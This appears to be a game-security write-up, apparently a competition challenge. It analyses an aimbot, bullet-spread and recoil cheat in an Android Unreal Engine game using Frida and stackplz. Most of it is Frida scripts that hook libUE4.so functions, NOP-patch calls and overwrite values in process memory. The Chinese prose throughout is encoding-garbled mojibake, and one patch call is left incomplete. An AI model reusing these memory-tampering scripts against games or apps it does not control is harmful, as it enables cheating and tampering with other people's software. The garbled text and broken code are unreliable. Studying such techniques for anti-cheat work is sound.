ä»”ç»†è§‚å¯Ÿæ¸¸æˆä¼šå‘ç°ï¼Œæ¯æ¬¡å¼€æªçš„æ—¶å€™å‡†æ˜Ÿéƒ½ä¼šé”å®šåœ¨ä¸€ä¸ªç®±å­é‚£é‡Œï¼Œæ— è®ºæ˜¯é‡å¯æ¸¸æˆè¿˜æ˜¯ç§»åŠ¨è§’è‰²æˆ–è€…ç®±å­åˆ°ä¸åŒä½ç½®ï¼Œå‡†æ˜Ÿå§‹ç»ˆåœ¨ä¸€ä¸ªç®±å­èº«ä¸Šï¼Œäºæ˜¯å…ˆå¯»æ‰¾å‡ºæ¥æ˜¯å“ªä¸€ä¸ªç®±å­ï¼Œåœ¨ä¹‹å‰dumpçš„Actoråˆ—è¡¨ä¸­å‘ç°æœ‰åä¸ºEditorCubeçš„å¯¹è±¡ï¼Œä¸€å…±æœ‰14ä¸ªï¼Œæ•°äº†ä¸€ä¸‹ç®±å­çš„æ•°é‡ä¹Ÿæ˜¯14ä¸ªï¼Œé‚£ä¹ˆåŸºæœ¬å¯ä»¥ç¡®å®šç®±å­å°±æ˜¯è¿™ä¸ªå¯¹è±¡ï¼Œç„¶åé€šè¿‡è¾“å‡ºæ‰€æœ‰ç®±å­çš„vectorçš„å€¼è·å–åæ ‡ï¼Œå†ç§»åŠ¨ç›®æ ‡ç®±å­å°±å¯ä»¥æ¯”å¯¹å‡ºæ¥æ˜¯å“ªä¸€ä¸ªç®±å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 class Vector { //è®¾ç½®å‘é‡å¯¹è±¡ constructor(x, y, z) { this.x = x; this.y = y; this.z = z; } // å°†å‘é‡è½¬æ¢ä¸ºå­—ç¬¦ä¸² toString() { return `(${this.x}, ${this.y}, ${this.z})`; } } function dumpVector(addr) { // dumpAddr(\u0026#39;firstPersion_RootComponent\u0026#39;,firstPersion_RootComponent_ptr,0x152) // ä»åœ°å€ç©ºé—´ä¸­è¯»å–ä¸‰ä¸ªæµ®ç‚¹æ•° const values = Memory.readByteArray(addr, 3 * 4); // 3ä¸ªfloatå…±å 12ä¸ªå­—èŠ‚ // è§£ææµ®ç‚¹æ•°å¹¶åˆå§‹åŒ– Vector å¯¹è±¡ const vec = new Vector( new Float32Array(values, 0, 1)[0], // è¯»å–ç¬¬ä¸€ä¸ªæµ®ç‚¹æ•° new Float32Array(values, 4, 1)[0], // è¯»å–ç¬¬äºŒä¸ªæµ®ç‚¹æ•° new Float32Array(values, 8, 1)[0] // è¯»å–ç¬¬ä¸‰ä¸ªæµ®ç‚¹æ•° ); console.log(\u0026#34;[+] åæ ‡ï¼š\u0026#34;, vec); //æ‰“å‡ºåæ ‡ã€‚ } function get_box_vec(){ getlibue4(); var base = Module.getBaseAddress(\u0026#34;libUE4.so\u0026#34;); var actorsAddr = getActorsAddr(); for (var key in actorsAddr) { if (key.includes(\u0026#34;EditorCube\u0026#34;)){ var actor_addr = actorsAddr[key]; var RootComponent = actor_addr.add(0x130).readPointer(); var Location = RootComponent.add(0x11C); console.log(\u0026#34;[+]Actor: \u0026#34;, key); dumpVector(Location); } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 Part 1 : [+]Actor: EditorCube8 [+] åæ ‡ï¼š (843.998779296875, -1169.60498046875, 295.23797607421875) [+]Actor: EditorCube9 [+] åæ ‡ï¼š (1464.425537109375, -657.312744140625, 245.24537658691406) [+]Actor: EditorCube10 [+] åæ ‡ï¼š (1464.425537109375, -46.785343170166016, 245.24537658691406) [+]Actor: EditorCube11 [+] åæ ‡ï¼š (860.821533203125, -46.78565216064453, 245.23817443847656) [+]Actor: EditorCube12 [+] åæ ‡ï¼š (1307.8231201171875, 714.8047485351563, 245.24351501464844) [+]Actor: EditorCube13 [+] åæ ‡ï¼š (1310.8233642578125, 874.9715576171875, 245.2435302734375) [+]Actor: EditorCube14 [+] åæ ‡ï¼š (1310.8233642578125, 790.3173828125, 395.24346923828125) [+]Actor: EditorCube15 [+] åæ ‡ï¼š (-896.7808227539063, 828.98193359375, 245.21722412109375) [+]Actor: EditorCube16 [+] åæ ‡ï¼š (-1034.357666015625, 746.9696655273437, 245.21559143066406) [+]Actor: EditorCube17 [+] åæ ‡ï¼š (-961.6449584960938, 790.31689453125, 395.21636962890625) [+]Actor: EditorCube18 [+] åæ ‡ï¼š (-1439.8385009765625, -811.4144897460937, 245.21078491210937) [+]Actor: EditorCube19 [+] åæ ‡ï¼š (-1439.401123046875, -811.4213256835937, 395.2096862792969) [+]Actor: EditorCube20 [+] åæ ‡ï¼š (-1309.3416748046875, -373.11163330078125, 295.2123107910156) [+]Actor: EditorCube21 [+] åæ ‡ï¼š (-1123.3922119140625, 153.2134246826172, 245.2145233154297) Part 2: [+]Actor: EditorCube8 [+] åæ ‡ï¼š (859.3866577148438, -1172.3924560546875, 295.2377624511719) [+]Actor: EditorCube9 [+] åæ ‡ï¼š (1464.425537109375, -657.312744140625, 245.24537658691406) [+]Actor: EditorCube10 [+] åæ ‡ï¼š (1464.425537109375, -46.785343170166016, 245.24537658691406) [+]Actor: EditorCube11 [+] åæ ‡ï¼š (860.821533203125, -46.78565216064453, 245.23817443847656) [+]Actor: EditorCube12 [+] åæ ‡ï¼š (1307.8231201171875, 714.8047485351563, 245.24351501464844) [+]Actor: EditorCube13 [+] åæ ‡ï¼š (1310.8233642578125, 874.9715576171875, 245.2435302734375) [+]Actor: EditorCube14 [+] åæ ‡ï¼š (1310.8233642578125, 790.3173828125, 395.24346923828125) [+]Actor: EditorCube15 [+] åæ ‡ï¼š (-896.7808227539063, 828.98193359375, 245.21722412109375) [+]Actor: EditorCube16 [+] åæ ‡ï¼š (-1034.357666015625, 746.9696655273437, 245.21559143066406) [+]Actor: EditorCube17 [+] åæ ‡ï¼š (-961.6449584960938, 790.31689453125, 395.21636962890625) [+]Actor: EditorCube18 [+] åæ ‡ï¼š (-1439.8385009765625, -811.4144897460937, 245.21078491210937) [+]Actor: EditorCube19 [+] åæ ‡ï¼š (-1439.401123046875, -811.4213256835937, 395.2096862792969) [+]Actor: EditorCube20 [+] åæ ‡ï¼š (-1309.3416748046875, -373.11163330078125, 295.2123107910156) [+]Actor: EditorCube21 [+] åæ ‡ï¼š (-1123.3922119140625, 153.2134246826172, 245.2145233154297) é€šè¿‡ä¸Šè¿°æ–¹æ³•æ¯”å¯¹ä¹‹åä¸éš¾å‘ç°åªæœ‰EditorCube8çš„å€¼å‘ç”Ÿäº†å˜åŒ–ï¼Œé‚£ä¹ˆå¯ä»¥ç¡®å®šè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡Actorï¼Œæ¥ä¸‹æ¥å¯»æ‰¾è¿™ä¸ªç®±å­çš„ä¸–ç•Œåæ ‡å¹¶ç»™åæ ‡ä¸‹ç¡¬ä»¶æ–­ç‚¹æ‰“å°è°ƒç”¨æ ˆ\né€šè¿‡Frida hook æˆ‘ä»¬å¯ä»¥è·å–è§’è‰²è§†è§’çš„Vectorçš„å€¼ï¼Œé€šè¿‡PlayerController + 0x288çš„åç§»å¤„å¯ä»¥è·å–åˆ°ControlRotationçš„åœ°å€ï¼Œå…¶ä¸­åç»­çš„12ä¸ªå­—èŠ‚å°±æ˜¯è§’è‰²çš„ç›¸æœºçš„ä½ç½®ä¿¡æ¯ï¼Œå³FRotatorç»“æ„ä½“ï¼Œå…¶æˆå‘˜å˜é‡åˆ†åˆ«æ˜¯Pitchï¼ŒYawï¼ŒRollï¼Œä½¿ç”¨stackplzç»™æ­¤å¤„ä¸‹ç¡¬ä»¶æ–­ç‚¹(w)å¹¶æ‰“å°è°ƒç”¨æ ˆå¯å›æº¯åˆ°å†™å…¥æ­¤å†…å­˜åœ°å€çš„å‡½æ•°çš„è°ƒç”¨æ ˆ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 function my_hack(){ getlibue4(); var actorsAddr = getActorsAddr(); var base = Module.getBaseAddress(\u0026#34;libUE4.so\u0026#34;); console.log(\u0026#34;[+] UE4 base = \u0026#34;, base); hook_addr(base.add(0x670f3f8)); for (var key in actorsAddr) { //console.log(\u0026#34;[+] current actor is : \u0026#34;, key); //console.log(\u0026#34;UE4 base = \u0026#34;, base); if (actorsAddr[key].readPointer() - base == 0xA63BE28) { console.log(\u0026#34;[+] Successful Get target Actor : \u0026#34;, key); var player_addr = actorsAddr[key]; var RecoilAccumulationRate = player_addr.add(0x538); var CharacterMovementComponent = player_addr.add(0x288).readPointer(); var MaxAcceleration = CharacterMovementComponent.add(0x1A0); Memory.writeFloat(MaxAcceleration, 1000); Memory.writeFloat(RecoilAccumulationRate, 0); } if (key == \u0026#34;PlayerController\u0026#34;){ console.log(\u0026#34;[+] Successful Get target Actor : \u0026#34;, key); var ControlRotation = actorsAddr[key].add(0x288); var Pitch = ControlRotation.add(0x0).readFloat(); var Yaw = ControlRotation.add(0x4).readFloat(); var Roll = ControlRotation.add(0x8).readFloat(); console.log(\u0026#34;[+] Pitch = {}, Yaw = {}, Roll = {}\u0026#34;, Pitch, Yaw, Roll); console.log(\u0026#34;[+] ControlRotation = \u0026#34;, ControlRotation); } } } ä¸‹æ–­ç‚¹\n1 ./stackplz --brk 0x758eb0f5c8:w --brk-len 4 --stack -o pitch.log 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 [23330|23381] event_addr:0x758eb0f5c8 hit_count:1, Backtrace: #00 pc 0000000008b387c0 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #01 pc 000000000670f3f8 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #02 pc 000000000670feac /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #03 pc 0000000009268e34 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #04 pc 0000000009266e00 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #05 pc 0000000008fa0588 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #06 pc 0000000008f9f6f0 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #07 pc 0000000008f9f370 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #08 pc 0000000008fa7354 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #09 pc 00000000091fdb88 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #10 pc 00000000067cebac /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #11 pc 00000000067ce72c /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #12 pc 00000000067cde20 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #13 pc 00000000091f9c00 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #14 pc 00000000091f73b8 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #15 pc 0000000008d3b75c /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #16 pc 0000000008c068ec /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #17 pc 0000000005af53b8 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #18 pc 0000000005af3510 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so [23330|23381] event_addr:0x758eb0f5c8 hit_count:2, Backtrace: #00 pc 0000000008b387c0 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #01 pc 0000000008f9b600 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #02 pc 0000000008fa7354 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #03 pc 00000000091fdb88 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #04 pc 00000000067cebac /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #05 pc 00000000067ce72c /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #06 pc 00000000067cde20 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #07 pc 00000000091f9c00 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #08 pc 00000000091f73b8 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #09 pc 0000000008d3b75c /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #10 pc 0000000008c068ec /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #11 pc 0000000005af53b8 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so #12 pc 0000000005af3510 /data/app/~~10p5bElEgTHlqQoqeGftBw==/com.ACE2025.Game-INpbz7MxpBsqqBF6R0aTwA==/lib/arm64/libUE4.so å¾—åˆ°è°ƒç”¨æ ˆä¿¡æ¯ï¼Œç»è¿‡åˆ†æå‘ç°0x8b387c0ä½ç½®çš„å‡½æ•°æ˜¯å‘FRotatorç»“æ„ä½“çš„æˆå‘˜å˜é‡å†™å…¥åæ ‡çš„ï¼Œè€Œ0x670f3f8è²Œä¼¼æ˜¯å¤„ç†ç”¨æˆ·äº¤äº’çš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¤„ç†å°„å‡»è¿™ä¸€è¡Œä¸ºçš„å‡½æ•°ï¼Œä½¿ç”¨Fridaå°†è¿™ä¸€å¤„çš„è°ƒç”¨PatchæˆNOPå¯ä»¥å®ç°è‡ªç„çš„å»é™¤\nå¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šå¯¹åæ ‡è¿›è¡Œä¸€äº›è®¡ç®—ï¼Œä¹‹åå°±è°ƒç”¨å‡½æ•°0x8b387c0å°†åæ ‡å†™å…¥åˆ°å¯¹åº”ç»“æ„ä½“ä¸­ï¼Œpatchæ­¤å¤„å‡½æ•°è°ƒç”¨å³å¯ä½¿å¤–æŒ‚åªè®¡ç®—è€Œä¸å†™å…¥åæ ‡ä¿¡æ¯\n1 2 3 4 5 6 7 function patch_addr(Addr){ Memory.protect(Addr, 4, \u0026#39;rwx\u0026#39;); Memory.patchCode(Addr, 4, function (code) { code.writeByteArray([0x1F, 0x20, 0x03, 0xD5]); }); } patch_addr(0x) å¼¹é“ è€ƒè™‘åˆ°è‡ªç„å®ç°çš„é€»è¾‘ä¸­ï¼Œè§’è‰²è§†è§’å’Œå­å¼¹å¼¹é“çš„æ”¹å˜åº”è¯¥åŒæ—¶å¤„ç†ï¼Œæ‰€ä»¥åœ¨å‰é¢ä¿®æ”¹è§’è‰²è§†è§’çš„å‡½æ•°ä¸­åŒæ ·å®ç°äº†ä¿®æ”¹å­å¼¹å¼¹é“çš„å…·ä½“å®ç°é€»è¾‘\nåˆ†æActorlistå¯ä»¥çŸ¥é“å­å¼¹çš„å¯¹è±¡æ˜¯FirstPersonProjectile_C,è¿™ä¸ªç±»ç»§æ‰¿è‡ªProjectileMovementComponent.MovementComponent.ActorComponent.Object é€šè¿‡hookæ‰“å°è¿™ä¸ªç±»çš„InitialSpeedå’ŒMaxSpeedå¯ä»¥å‘ç°è¿™ä¸¤ä¸ªå€¼éƒ½æ˜¯3000è¯´æ˜å­å¼¹é€Ÿåº¦å¹¶æ²¡æœ‰è¢«ä¿®æ”¹\nåœ¨å‡½æ•°sub_670F110ä¸­ç»§ç»­åˆ†æå¯ä»¥çœ‹åˆ°å‰é¢patchçš„åœ°æ–¹çš„åé¢å°±æ˜¯å¤„ç†å­å¼¹å¼¹é“çš„é€»è¾‘ å…¶ä¸­ChangeCornerå‡½æ•°(å·²æ”¹å)æ˜¯ç”¨æ¥æ§åˆ¶å­å¼¹å¼¹é“éšæœºåŒ–çš„(-30Â°åˆ°30Â°)\nsub8D2ED80å‡½æ•°æ˜¯æ§åˆ¶æªå£Locationå’ŒRotationçš„å…³é”®é€»è¾‘ï¼Œå‡½æ•°è°ƒç”¨é“¾ä¸ºsub_8D2ED80-\u0026gt;sub_8D2E214ï¼Œsub_8D2E214æ˜¯å¤„ç†spawnactorçš„å‡½æ•°ï¼Œè§ä¸‹å›¾\né˜…è¯»UE4å®˜æ–¹æ–‡æ¡£å¯ä»¥çŸ¥é“å­å¼¹å¯¹è±¡çš„ç”Ÿæˆé€»è¾‘å’Œå‘å°„æ–¹å‘çš„é€»è¾‘\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 UWorld* World = GetWorld(); if (World) { FActorSpawnParameters SpawnParams; SpawnParams.Owner = this; SpawnParams.Instigator = GetInstigator(); // åœ¨æªå£ä½ç½®ç”Ÿæˆå‘å°„ç‰©ã€‚ AFPSProjectile* Projectile = World-\u0026gt;SpawnActor\u0026lt;AFPSProjectile\u0026gt;(ProjectileClass, MuzzleLocation, MuzzleRotation, SpawnParams); if (Projectile) { // è®¾ç½®å‘å°„ç‰©çš„åˆå§‹è½¨è¿¹ã€‚ FVector LaunchDirection = MuzzleRotation.Vector(); Projectile-\u0026gt;FireInDirection(LaunchDirection); } } å¯ä»¥çœ‹åˆ°MuzzleLocationæ˜¯æªå£çš„ä½ç½®ä¿¡æ¯ï¼ŒMuzzleRotationæ˜¯æªå£çš„æœå‘ä¿¡æ¯ï¼Œè€Œå‘å°„ç‰©çš„åˆå§‹è½¨è¿¹å°±æ˜¯é€šè¿‡MuzzleRotationæ¥è®¾ç½®çš„ï¼Œé€šè¿‡Frida hookè·å– sub_8D2ED80å‡½æ•°è°ƒç”¨å‰çš„å¯„å­˜å™¨ä¿¡æ¯å¯ä»¥çŸ¥é“å…¶ç¬¬ä¸‰å’Œç¬¬å››ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„Locationå’ŒRotation\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 Interceptor.attach(base.add(0x670F6B8), { onEnter: function(args) { var X2 = this.context.x2; var X3 = this.context.x3; var X4 = this.context.x4; console.log(\u0026#34;[+] dump Muzzle location\u0026#34;); dumpVector(X2); console.log(\u0026#34;[+] dump Muzzle rotation\u0026#34;); dumpVector(X3); }, onLeave: function(retval) { } }); /* [+] dump Muzzle location [+] åæ ‡ï¼š (-156.2298126220703, -194.9197540283203, 398.4053649902344) [+] dump Muzzle rotation [+] åæ ‡ï¼š (-0.8549373745918274, -45.907772064208984, 0) [+] dump Muzzle location [+] åæ ‡ï¼š (-156.7232666015625, -193.81390380859375, 397.9298095703125) [+] dump Muzzle rotation [+] åæ ‡ï¼š (-0.8514755964279175, -45.91944122314453, 0) [+] dump Muzzle location [+] åæ ‡ï¼š (-156.3829803466797, -194.585205078125, 398.2392272949219) [+] dump Muzzle rotation [+] åæ ‡ï¼š (-0.8617335557937622, -45.91222381591797, 0) */ é€šè¿‡æ§åˆ¶å˜é‡å¤šæ¬¡è°ƒæ•´è§’è‰²çš„ä½ç½®å¹¶è§¦å‘hookå¯ä»¥çŸ¥é“æˆ‘ä»¬çš„åˆ†ææ²¡æœ‰é—®é¢˜ï¼Œä¸‹é¢åªéœ€è¦æŠŠå­å¼¹çš„Rotationæ¢æˆæ‘„åƒæœºçš„Rotationå³å¯,åœ¨onEnterå›è°ƒä¸­åŠ¨æ€è·å–è§’è‰²çš„Rotationå¹¶ä¿®æ”¹è¿›å»å³å¯,Fridaè„šæœ¬å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 function changeVector(addr, x, y, z) { //ä¿®æ”¹å‘é‡ Memory.writeFloat(addr, x); Memory.writeFloat(addr.add(4), y); Memory.writeFloat(addr.add(8), z); } function my_hack(){ getlibue4(); var actorsAddr = getActorsAddr(); var base = Module.getBaseAddress(\u0026#34;libUE4.so\u0026#34;); console.log(\u0026#34;[+] UE4 base = \u0026#34;, base); patch_addr(base.add(0x670f3f8)); // ä¿®å¤è§’è‰²è§†è§’è‡ªç„ patch_addr(base.add(0x670F644)); // ä¿®å¤å­å¼¹éšæœºåˆ†å¸ƒ for (var key in actorsAddr) { //console.log(\u0026#34;[+] current actor is : \u0026#34;, key); //console.log(\u0026#34;UE4 base = \u0026#34;, base); if (actorsAddr[key].readPointer() - base == 0xA63BE28) { //ç¬ç§»åŠååº§åŠ›ä¿®å¤ console.log(\u0026#34;[+] Successful Get target Actor : \u0026#34;, key); var player_addr = actorsAddr[key]; var RecoilAccumulationRate = player_addr.add(0x538); var CharacterMovementComponent = player_addr.add(0x288).readPointer(); var MaxAcceleration = CharacterMovementComponent.add(0x1A0); Memory.writeFloat(MaxAcceleration, 1000); Memory.writeFloat(RecoilAccumulationRate, 0); } if (key == \u0026#34;PlayerController\u0026#34;){ console.log(\u0026#34;[+] Successful Get target Actor : \u0026#34;, key); var ControlRotation = actorsAddr[key].add(0x288); var Pitch = ControlRotation.add(0x0).readFloat(); var Yaw = ControlRotation.add(0x4).readFloat(); var Roll = ControlRotation.add(0x8).readFloat(); //changeVector(ControlRotation, 0, 0, 0); console.log(\u0026#34;[+] Pitch = {}, Yaw = {}, Roll = {}\u0026#34;, Pitch, Yaw, Roll); console.log(\u0026#34;[+] ControlRotation = \u0026#34;, ControlRotation); } } // Interceptor.replace(base.add(0x670FBAC), new NativeCallback(() =\u0026gt; { // return 0.0; // è¿”å›é›¶æ•£å¸ƒè§’åº¦ // }, \u0026#39;float\u0026#39;, [\u0026#39;pointer\u0026#39;])); // ä¿®å¤å¼¹é“ Interceptor.attach(base.add(0x670F6B8), { onEnter: function(args) { var player_rotation = ControlRotation; var PlayerPitch = player_rotation.add(0x0).readFloat(); var PlayerYaw = player_rotation.add(0x4).readFloat(); var PlayerRoll = player_rotation.add(0x8).readFloat(); var X2 = this.context.x2; var X3 = this.context.x3; // console.log(\u0026#34;[+] dump Muzzle location\u0026#34;); // dumpVector(X2); // console.log(\u0026#34;[+] dump Muzzle rotation\u0026#34;); // dumpVector(X3); changeVector(X3, PlayerPitch, PlayerYaw, PlayerRoll); }, onLeave: function(retval) { } }); } é€è§†(æœªå®ç°) è§‚å¯Ÿæ¸¸æˆä¸­é€è§†çš„ç‰¹å¾å¯ä»¥å‘ç°æ— è§†äº†å¢™å£ç›´æ¥æ¸²æŸ“åœ¨æˆ‘ä»¬çš„è§†è§’ä¸­ï¼Œè¯´æ˜ä»–å¯èƒ½ä¿®æ”¹äº†æè´¨çš„bDisableDepthTestçš„å€¼ä¸ºTrueï¼Œä½¿å¾—äººç‰©æ¨¡å‹å¯ä»¥é€è¿‡å¢™å£çœ‹è§ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¿®æ”¹äº†æ¨¡å‹çš„æ¸²æŸ“é¡ºåºä½¿å¾—ç©å®¶çš„æ¨¡å‹æœ€åæ¸²æŸ“ï¼Œå¹¶ä¸”äººç‰©å˜æˆäº†çº¢è‰²é«˜äº®çŠ¶æ€ï¼Œè¿™é€šå¸¸ä¼šè°ƒç”¨SetVectorParameterValueå‡½æ•°å¯¹æè´¨çš„RGBå€¼è¿›è¡Œä¿®æ”¹ã€‚\né€šè¿‡ç±»æˆå‘˜å˜é‡ä¹‹é—´çš„å¼•ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€æ¡è·å–Materialå¯¹è±¡çš„æŒ‡é’ˆé“¾ï¼šCharacter -\u0026gt; SkeletalMeshComponent - \u0026gt;SkinnedMeshComponent -\u0026gt; SkeletalMesh -\u0026gt; SkeletalMaterial -\u0026gt; MaterialInterface -\u0026gt; Materialï¼›è·å–åˆ°Materialä¹‹åå°±å¯ä»¥ä¿®æ”¹ä»–çš„æˆå‘˜å˜é‡bDisableDepthTestï¼Œç»è¿‡Frida hookä¹‹åä¹Ÿç¡®å®å‘ç°è¿™ä¸ªå€¼æ˜¯Trueï¼Œä½†æ˜¯ä¿®æ”¹æˆFalseä¹‹åé€è§†æ•ˆæœä¾ç„¶å­˜åœ¨ï¼Œä¹Ÿæƒ³è¿‡å¯èƒ½æ˜¯è¿™ä¸ªboolå˜é‡åªä¼šè¯»å–ä¸€æ¬¡ï¼Œä½†æ˜¯å®åœ¨æ˜¯æ‰¾ä¸åˆ°hookæ—¶æœºæ¥ä¿®æ”¹è¿™ä¸€ç‚¹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 function get_material(Name){ getlibue4(); var ThirdPerson = getActorAddr(Name); var SkeletalMeshComponent = ThirdPerson.add(0x280).readPointer(); // var bCollideWithEnvironment = SkeletalMeshComponent.add(0x8C0).readU8() \u0026amp; 0x80; // console.log(\u0026#34;[+] bCollideWithEnvironment = \u0026#34;, bCollideWithEnvironment); // Memory.protect(SkeletalMeshComponent.add(0x8C0), 4, \u0026#39;rwx\u0026#39;); // const newByteValue_1 = SkeletalMeshComponent.add(0x8C0).readU8() ^ 0x80; // SkeletalMeshComponent.add(0x8C0).writeU8(newByteValue_1); console.log(\u0026#34;[+] bCollideWithEnvironment Patched = \u0026#34;, SkeletalMeshComponent.add(0x8C0).readU8() \u0026amp; 0x80); var SkeletalMesh = SkeletalMeshComponent.add(0x478).readPointer(); var SkeletalMaterial_array = SkeletalMesh.add(0xD8); var dataPtr = SkeletalMaterial_array.readPointer(); var count = SkeletalMaterial_array.add(0x8).readU32(); console.log(\u0026#34;[+] SkeletalMaterial count = \u0026#34;, count); console.log(`Materialsæ•°ç»„: æ•°é‡=${count}, æŒ‡é’ˆ=0x${dataPtr.toString(16)}`); var getMaterial = new NativeFunction(Module.getBaseAddress(\u0026#34;libUE4.so\u0026#34;).add(0x94e8370), \u0026#39;pointer\u0026#39;, [\u0026#39;pointer\u0026#39;]); for (var i = 0; i \u0026lt; count; i++) { if (i == 0){ var MaterialInterface = dataPtr.add(i * 8).readPointer(); var Material = getMaterial(MaterialInterface); console.log(\u0026#34;[+] bDisableDepthTest = \u0026#34;, Material.add(0x1f8).readU8() \u0026amp; 0x1) var bDisableDepthTest = (Material.add(0x1f8).readU8() \u0026amp; 0x1) == 0; //console.log(`Material[${i}] = 0x${Material.toString(16)}, bDisableDepthTest = ${bDisableDepthTest}`); Memory.protect(Material.add(0x1f8), 4, \u0026#39;rwx\u0026#39;); const newByteValue = Material.add(0x1f8).readU8() ^ 0x1; // æŒ‰å¼‚æˆ–æˆ–æ“ä½œ Material.add(0x1f8).writeU8(newByteValue); console.log(\u0026#34;[+] bDisableDepthTest Patched = \u0026#34;, Material.add(0x1f8).readU8() \u0026amp; 0x1) //console.log(`Material[${i}] = 0x${Material.toString(16)}, bDisableDepthTest = ${bDisableDepthTest}`); } } } 